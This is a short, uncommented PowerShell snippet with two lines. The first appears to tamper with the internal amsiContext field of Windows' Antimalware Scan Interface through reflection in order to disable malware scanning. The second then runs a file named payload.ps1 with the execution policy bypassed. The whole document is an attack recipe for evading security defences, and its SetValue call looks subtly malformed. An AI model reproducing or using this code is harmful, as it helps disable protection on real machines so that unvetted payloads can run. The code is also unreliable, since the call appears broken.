
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, $null, $null, [IntPtr]$mem)

powershell -executionpolicy bypass .\payload.ps1
